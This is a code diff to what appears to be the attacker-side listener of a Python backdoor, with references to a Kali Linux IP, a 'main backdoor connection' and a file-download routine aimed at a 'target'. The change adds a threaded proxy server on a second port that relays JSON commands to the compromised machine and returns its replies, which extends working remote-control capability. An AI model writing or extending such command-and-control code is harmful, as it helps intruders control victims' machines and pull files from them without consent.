@@ -6,6 +6,11 @@
 # Import necessary libraries
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
+import threading  # For proxy server
+import os  # For file operations
+
+# Import configuration
+from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT
 
 
 # Function to send data reliably as JSON-encoded strings
@@ -59,6 +64,71 @@ def download_file(file_name):
     target.settimeout(None)
     # Close the local file after downloading is complete.
     f.close()
+
+
+# Proxy server for port 5556
+def handle_proxy_client(proxy_socket, proxy_address):
+    """Handle proxy connections by forwarding to main target"""
+    print(f'[PROXY] Client connected: {proxy_address}')
+    
+    try:
+        while True:
+            data = proxy_socket.recv(4096)
+            if not data:
+                break
+                
+            try:
+                # Parse command and forward to main target
+                command = json.loads(data.decode().strip())
+                print(f'[PROXY] Command: {command}')
+                
+                if target:
+                    reliable_send(command)
+                    response = reliable_recv()
+                    proxy_socket.send(json.dumps(response).encode())
+                else:
+                    error_msg = "Error: No main backdoor connection"
+                    proxy_socket.send(json.dumps(error_msg).encode())
+                    
+            except json.JSONDecodeError:
+                error_msg = "Error: Invalid JSON command"
+                proxy_socket.send(json.dumps(error_msg).encode())
+            except Exception as e:
+                error_msg = f"Error: {str(e)}"
+                proxy_socket.send(json.dumps(error_msg).encode())
+                
+    except Exception as e:
+        print(f'[PROXY] Connection error: {e}')
+    finally:
+        proxy_socket.close()
+        print(f'[PROXY] Client disconnected: {proxy_address}')
+
+def start_proxy_server():
+    """Start proxy server on port 5556"""
+    proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    try:
+        proxy_sock.bind((SERVER_IP, PROXY_PORT))
+        proxy_sock.listen(5)
+        print(f'[+] Proxy Server Listening on {SERVER_IP}:{PROXY_PORT}')
+        
+        while True:
+            try:
+                proxy_client, proxy_addr = proxy_sock.accept()
+                proxy_thread = threading.Thread(
+                    target=handle_proxy_client,
+                    args=(proxy_client, proxy_addr),
+                    daemon=True
+                )
+                proxy_thread.start()
+            except Exception as e:
+                print(f'[PROXY] Accept error: {e}')
+                
+    except Exception as e:
+        print(f'[PROXY] Server error: {e}')
+    finally:
+        proxy_sock.close()
 
 
 # Function for the main communication loop with the target
@@ -304,12 +374,15 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Allow socket reuse to prevent "Address already in use" error
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-# Bind the socket to listen on all interfaces and port 5555
-# CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
-sock.bind(('0.0.0.0', 5555))  # Listen on all interfaces
+# Start proxy server in background thread
+proxy_thread = threading.Thread(target=start_proxy_server, daemon=True)
+proxy_thread.start()
+
+# Bind the socket to configured IP and main port
+sock.bind((SERVER_IP, SERVER_PORT))
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections on port 5555')
+print(f'[+] Main Server Listening on {SERVER_IP}:{SERVER_PORT}')
 sock.listen(5)
 
 # Accept incoming connection from the target and obtain the target's IP address.
